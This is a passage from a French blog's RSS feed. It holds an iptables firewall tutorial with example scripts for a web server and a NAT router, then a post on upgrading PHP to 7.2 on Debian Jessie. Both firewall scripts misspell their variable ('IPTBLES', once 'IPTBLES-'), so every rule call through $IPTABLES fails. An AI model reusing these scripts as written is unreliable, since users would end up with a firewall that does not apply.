+&lt;p&gt;Cette commande lance le script d'initialisation d'iptables qui va lancer le programme &lt;code&gt;/sbin/iptables-save&lt;/code&gt; . Ce programme va écrire la configuration iptables active dans le fichier &lt;code&gt;/etc/sysconfig/iptables&lt;/code&gt; . L'ancien fichier est sauvegardé dans &lt;code&gt;/etc/sysconfig/iptables.save&lt;/code&gt; . Bien qu'il soit toujours une bonne idée de tester une nouvelle règle iptables avant de l'écrire dans le fichier &lt;code&gt;/etc/sysconfig/iptables&lt;/code&gt;, il est possible d'écrire directement dans ce fichier. Cela permet de distribuer rapidement un ensemble de règles iptables sur plusieurs machines. Dans ce cas, à chaque modification du fichier, il faut réappliquer les règles en utilisant la commande &lt;code&gt;/sbin/service iptables restart&lt;/code&gt; .&lt;/p&gt;
+&lt;h4&gt;Debian / Ubuntu&lt;/h4&gt;
+&lt;h5&gt;méthode traditionelle&lt;/h5&gt;
+&lt;p&gt;Pour sauvegarder la configuration iptables active dans un fichier:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables-save &amp;gt; /etc/iptables.up.rules
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;ensuite pour que la configuration soit chargée au prochaine reboot, vous pouvez créer un script:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;vi /etc/network/if-pre-up.d/iptables
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En plaçant ce script dans ce dossier, il sera lancé juste avant l'activation du réseau. Ainsi votre machine est tout le temps protégée.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt; &lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;
+ /sbin/iptables-restore &amp;lt; /etc/iptables.up.rules
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;il faut ensuite rendre ce script exécutable:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;chmod +x /etc/network/if-pre-up.d/iptables
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;méthode simple&lt;/h5&gt;
+&lt;p&gt;Vous pouvez utiliser le paquet « iptables-persistent »&lt;/p&gt;
+&lt;p&gt;ce paquet vous propose deux commandes:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;netfilter-persistent save
+netfilter-persistent reload
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce programme va créer deux fichiers: &lt;code&gt;/etc/iptables/rules.v4&lt;/code&gt; et &lt;code&gt;/etc/iptables/rules.v6&lt;/code&gt; . Il vous suffit d'éditer ces fichiers pour modifier la configuration.&lt;/p&gt;
+&lt;h5&gt;méthode alternative&lt;/h5&gt;
+&lt;p&gt;Cette méthode alternative a pour avantage de pouvoir facilement activer et désactiver le firewall. On crée un script et on le lance directement au démarrage du réseau. Voici un exemple de fichier de configuration de vos interfaces qui va prendre ce script en compte:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# This file describes the network interfaces available on your system&lt;/span&gt;
+&lt;span class="c1"&gt;# and how to activate them. For more information, see interfaces(5).&lt;/span&gt;
+
+&lt;span class="nb"&gt;source&lt;/span&gt; /etc/network/interfaces.d/*
+
+&lt;span class="c1"&gt;# The loopback network interface&lt;/span&gt;
+auto lo
+iface lo inet loopback
+
+&lt;span class="c1"&gt;# The WAN Interface&lt;/span&gt;
+allow-hotplug eno1
+iface eno1 inet dhcp
+        post-up /usr/local/bin/firewall.sh start
+        pre-down /usr/local/bin/firewall.sh stop
+&lt;span class="c1"&gt;# The LAN  network interface&lt;/span&gt;
+allow-hotplug eno2
+iface eno2 inet static
+    address &lt;span class="m"&gt;192&lt;/span&gt;.168.1.250
+    netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Les exemples suivants sont des exemples de scripts comme expliqué ici.&lt;/p&gt;
+&lt;h2&gt;Exemples de configurations&lt;/h2&gt;
+&lt;h3&gt;Exemple de configuration basique pour un serveur web&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class="nv"&gt;IPTBLES&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/sbin/iptables
+&lt;span class="nv"&gt;WAN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;eth0 &lt;span class="c1"&gt;#Nom de l&amp;#39;interface qui sera relié à internet&lt;/span&gt;
+&lt;span class="nv"&gt;LAN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;eth1 &lt;span class="c1"&gt;#Nom de l&amp;#39;interface qui sera reliée au réseau local&lt;/span&gt;
+
+firewall_start&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;#Exécuter lors du routeur.sh start&lt;/span&gt;
+
+&lt;span class="c1"&gt;#-------------------- INPUT -------------------&lt;/span&gt;
+&lt;span class="c1"&gt;#Ces règles s&amp;#39;appliquent aux paquets entrants&lt;/span&gt;
+
+&lt;span class="c1"&gt;#Tout ce qui sort peut rentrer à nouveau &lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -i &lt;span class="nv"&gt;$WAN&lt;/span&gt; -m state --state ESTABLISHED,RELATED -j ACCEPT 
+
+&lt;span class="c1"&gt;#On autorise le PING sur l&amp;#39;interface WAN (facultatif)&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -i &lt;span class="nv"&gt;$WAN&lt;/span&gt; -p icmp -j ACCEPT
+
+&lt;span class="c1"&gt;#On laisse passer tout ce qui rentre dans l&amp;#39;interface lan afin de permettre à nos utilisateurs d&amp;#39;utiliser le DHCP, le DNS...etc.&lt;/span&gt;
+&lt;span class="c1"&gt;#Mais on aurait aussi pu n&amp;#39;autoriser que certains services.&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -i &lt;span class="nv"&gt;$LAN&lt;/span&gt; -j ACCEPT
+
+&lt;span class="c1"&gt;#On ouvre les ports 80 et 443 pour notre serveur web&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -p tcp -m tcp --dport &lt;span class="m"&gt;80&lt;/span&gt; -j ACCEPT
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -p tcp -m tcp --dport &lt;span class="m"&gt;443&lt;/span&gt; -j ACCEPT
+
+&lt;span class="c1"&gt;#Tout ce qui ne MATCH pas avec les règles précédente &amp;gt; ON jette !&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P INPUT DROP
+
+&lt;span class="c1"&gt;#-------------------- FORWARD -------------------&lt;/span&gt;
+&lt;span class="c1"&gt;#Ces règles s&amp;#39;appliquent au paquets traversant le routeur&lt;/span&gt;
+&lt;span class="c1"&gt;# Par defaut, on refuse tout&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P FORWARD DROP
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+firewall_stop&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;#exécuté lors du routeur.sh stop&lt;/span&gt;
+
+&lt;span class="c1"&gt;#Clear des différentes tables d&amp;#39;iptables et remise à zéro de la configuration.&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -F
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -t nat -F
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P INPUT ACCEPT
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P FORWARD ACCEPT
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+firewall_restart&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;#exécuté lors du routeur.sh restart&lt;/span&gt;
+firewall_stop
+sleep &lt;span class="m"&gt;2&lt;/span&gt;
+firewall_start
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nv"&gt;$1&lt;/span&gt; in &lt;span class="s1"&gt;&amp;#39;start&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;)&lt;/span&gt;
+firewall_start
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;stop&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;)&lt;/span&gt;
+firewall_stop
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;restart&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;)&lt;/span&gt;
+firewall_restart
+&lt;span class="p"&gt;;;&lt;/span&gt;
+*&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;usage: -bash {start|stop|restart}&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="k"&gt;esac&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Exemple de mise en place d'un routeur&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/sh&lt;/span&gt;
+IPTBLES-/sbin/iptables
+&lt;span class="nv"&gt;WAN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;eth0 &lt;span class="c1"&gt;#Nom de l&amp;#39;interface qui sera relié à internet&lt;/span&gt;
+&lt;span class="nv"&gt;LAN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;eth1 &lt;span class="c1"&gt;#Nom de l&amp;#39;interface qui sera reliée au réseau local&lt;/span&gt;
+
+firewall_start&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;#Exécuter lors du routeur.sh start&lt;/span&gt;
+
+&lt;span class="c1"&gt;#-------------------- INPUT -------------------&lt;/span&gt;
+&lt;span class="c1"&gt;#Ces règles s&amp;#39;appliquent aux paquets entrants&lt;/span&gt;
+
+&lt;span class="c1"&gt;#Tout ce qui sort peut rentrer à nouveau &lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -i &lt;span class="nv"&gt;$WAN&lt;/span&gt; -m state --state ESTABLISHED,RELATED -j ACCEPT 
+
+&lt;span class="c1"&gt;#On autorise le PING sur l&amp;#39;interface WAN (facultatif)&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -i &lt;span class="nv"&gt;$WAN&lt;/span&gt; -p icmp -j ACCEPT
+
+&lt;span class="c1"&gt;#On laisse passer tout ce qui rentre dans l&amp;#39;interface lan afin de permettre à nos utilisateurs d&amp;#39;utiliser le DHCP, le DNS...etc.&lt;/span&gt;
+&lt;span class="c1"&gt;#Mais on aurait aussi pu n&amp;#39;autoriser que certains services.&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A INPUT -i &lt;span class="nv"&gt;$LAN&lt;/span&gt; -j ACCEPT
+
+&lt;span class="c1"&gt;#Tout ce qui ne MATCH pas avec les règles précédente &amp;gt; ON jette !&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P INPUT DROP
+
+
+&lt;span class="c1"&gt;#-------------------- NAT -------------------&lt;/span&gt;
+&lt;span class="c1"&gt;#Ces règles effectuent la réécriture d&amp;#39;adresses du NAT&lt;/span&gt;
+
+&lt;span class="c1"&gt;#Tout ce qui a fini de traverser le routeur (postrouting) et qui sort par le WAN sera NATté&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A POSTROUTING -t nat -o &lt;span class="nv"&gt;$WAN&lt;/span&gt; -j MASQUERADE
+
+&lt;span class="c1"&gt;#Routage du port 80&lt;/span&gt;
+&lt;span class="c1"&gt;#Tout se qui rentre sur le WAN (input donc) et qui rentre dans le TCP:80 sera rediriger vers 192.168.1.100:80 &lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A PREROUTING -t nat -j DNAT -i &lt;span class="nv"&gt;$WAN&lt;/span&gt; -p tcp --dport &lt;span class="m"&gt;80&lt;/span&gt; --to-destination &lt;span class="m"&gt;192&lt;/span&gt;.168.1.100:80 
+
+
+
+&lt;span class="c1"&gt;#-------------------- FORWARD -------------------&lt;/span&gt;
+&lt;span class="c1"&gt;#Ces règles s&amp;#39;appliquent au paquets traversant le routeur&lt;/span&gt;
+
+&lt;span class="c1"&gt;#Tout ce qui vient du WAN et sort par le LAN et qui correspond à une réponse est autorisé à passer.&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A FORWARD -i &lt;span class="nv"&gt;$WAN&lt;/span&gt; -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+&lt;span class="c1"&gt;#Tout ce qui part du LAN est autorisé à traverser le routeur.&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A FORWARD -i &lt;span class="nv"&gt;$LAN&lt;/span&gt; -j ACCEPT
+
+&lt;span class="c1"&gt;#On autorise les paquets à traverser vers notre pc local uniquement pour le service. Cette règle est complémentaire de la règle NAT de routage du port 80&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -A FORWARD -i &lt;span class="nv"&gt;$WAN&lt;/span&gt; -p tcp --dport &lt;span class="m"&gt;80&lt;/span&gt; -d &lt;span class="m"&gt;192&lt;/span&gt;.168.1.100 -j ACCEPT 
+
+
+&lt;span class="c1"&gt;#Tout ce qui ne MATCH pas avec les règles précédente &amp;gt; ON jette !&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P FORWARD DROP
+
+
+
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+firewall_stop&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;#exécuté lors du routeur.sh stop&lt;/span&gt;
+
+&lt;span class="c1"&gt;#Clear des différentes tables d&amp;#39;iptables et remise à zéro de la configuration.&lt;/span&gt;
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -F
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -t nat -F
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P INPUT ACCEPT
+&lt;span class="nv"&gt;$IPTABLES&lt;/span&gt; -P FORWARD ACCEPT
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+firewall_restart&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;#exécuté lors du routeur.sh restart&lt;/span&gt;
+firewall_stop
+sleep &lt;span class="m"&gt;2&lt;/span&gt;
+firewall_start
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nv"&gt;$1&lt;/span&gt; in &lt;span class="s1"&gt;&amp;#39;start&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;)&lt;/span&gt;
+firewall_start
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;stop&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;)&lt;/span&gt;
+firewall_stop
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="s1"&gt;&amp;#39;restart&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;)&lt;/span&gt;
+firewall_restart
+&lt;span class="p"&gt;;;&lt;/span&gt;
+*&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;usage: -bash {start|stop|restart}&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="k"&gt;esac&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Sources scripts: &lt;a href="https://www.netsh.be/routeur-linux-iptables/"&gt;NetSH&lt;/a&gt;
+ Bibliographie: ENI Service&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Sun, 05 Aug 2018 19:32:33 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2018-08-05:/fonctionnement-et-parametrage-dun-firewall-avec-netfilter-et-iptables.html</guid><category>Réseau</category><category>[firewall</category><category>securite]</category></item><item><title>Mise à jour vers PHP 7.2 sur Debian 8 Jessie</title><link>https://Coubiac.github.io/mise-a-jour-vers-php-72-sur-debian-8-jessie.html</link><description>&lt;p&gt;Avec l'arrivée de Symfony 4.1, PHP 7.2 est obligatoire. Si votre serveur est encore avec DEBIAN 8 Jessie, voici comment mettre à jour PHP vers la version 7.2:&lt;/p&gt;
+&lt;p&gt;Ondřej Surý fournit des paquets PHP 7.2 pour Debian sur son dépot:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;apt-get install apt-transport-https lsb-release ca-certificates
+wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb https://packages.sury.org/php/ &lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;lsb_release -sc&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; main&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee /etc/apt/sources.list.d/php.list
+apt-get update
+apt-get install php7.2-cli
+apt-get install php7.2 php7.2-opcache libapache2-mod-php7.2 php7.2-mysql php7.2-curl php7.2-json php7.2-gd  php7.2-intl php7.2-mbstring php7.2-xml php7.2-zip php7.2-fpm php7.2-readline
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ensuite, redémarrez APACHE:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;service apache2 restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si tout s'est bien passé, la commande &lt;code&gt;php -v&lt;/code&gt; devrait vous retourner:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PHP &lt;span class="m"&gt;7&lt;/span&gt;.2.7-2+0~20180714182401.1+jessie~1.gbp3fcba8 &lt;span class="o"&gt;(&lt;/span&gt;cli&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;built: Jul &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;2018&lt;/span&gt; &lt;span class="m"&gt;13&lt;/span&gt;:57:20&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt; NTS &lt;span class="o"&gt;)&lt;/span&gt;
+Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1997&lt;/span&gt;-2018 The PHP Group
+Zend Engine v3.2.0, Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1998&lt;/span&gt;-2018 Zend Technologies
+    with Zend OPcache v7.2.7-2+0~20180714182401.1+jessie~1.gbp3fcba8, Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;1999&lt;/span&gt;-2018, by Zend Technologies
+    with Xdebug v2.6.0, Copyright &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2002&lt;/span&gt;-2018, by Derick Rethans
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoît</dc:creator><pubDate>Sun, 22 Jul 2018 10:07:33 +0200</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2018-07-22:/mise-a-jour-vers-php-72-sur-debian-8-jessie.html</guid><category>Linux</category><category>[Debian</category><category>PHP]</category></item></channel></rss>
